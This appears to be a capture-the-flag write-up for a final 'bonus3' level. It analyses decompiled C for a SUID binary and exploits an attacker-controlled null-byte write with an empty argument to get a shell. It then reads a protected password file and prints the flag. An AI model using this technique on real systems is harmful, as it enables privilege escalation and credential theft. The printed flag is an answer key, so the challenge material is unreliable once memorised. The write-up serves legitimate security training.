# Bonus 3

Same recon as level0: SUID **end**. Final level.

## Analysis

```c
int main(int argc, char **argv) {
    char buffer[132];
    FILE *fp = fopen("/home/user/end/.pass", "r");
    if (!fp || argc != 2) return -1;

    fread(buffer, 1, 66, fp);
    buffer[65] = 0;
    buffer[atoi(argv[1])] = 0;            // null byte at attacker-chosen index
    fread(buffer + 66, 1, 65, fp);
    if (strcmp(buffer, argv[1]) == 0)     // compare buffer to our own argument
        execl("/bin/sh", "sh", (char *)0);
    else
        puts(buffer + 66);
}
```

The bug is `buffer[atoi(argv[1])] = 0`: we place a null at any index. To get the shell, `buffer` (the password, truncated at that index) must equal `argv[1]`. Matching the real password needs `argv[1]` to both equal a length-N prefix of the password and have `atoi(argv[1]) == N`, a circular constraint.

## Exploit

Sidestep it with `N = 0`. For `argv[1] = ""`:

- `atoi("") = 0`, so `buffer[0] = 0` makes `buffer` the empty string,
- `strcmp("", "") == 0` → shell.

The empty string matches itself, no password needed. It must be exactly empty: a non-numeric arg like `"abc"` also gives `atoi = 0`, but then `strcmp("", "abc") != 0`. And `argc != 2` requires exactly one argument, so `./bonus3 ""` (argc 2, empty arg) is the only form that works.

```bash
./bonus3 ""
cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

Flag: `3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c`
